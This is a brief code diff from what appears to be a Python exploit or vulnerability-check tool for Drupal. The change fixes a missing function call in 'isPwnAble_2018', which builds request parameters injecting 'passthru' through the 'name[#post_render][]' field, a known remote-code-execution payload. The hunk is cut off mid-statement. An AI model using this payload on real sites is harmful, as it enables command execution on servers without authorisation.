@@ -34,7 +34,7 @@ def isFormValid(host, version, headers):
 
 
 def isPwnAble_2018(host, version, headers):
-    signature = ulti.genSignature
+    signature = ulti.genSignature()
     version = version[:1]
     if version == '7':
         get_params = {'q': 'user/password', 'name[#post_render][]': 'passthru',
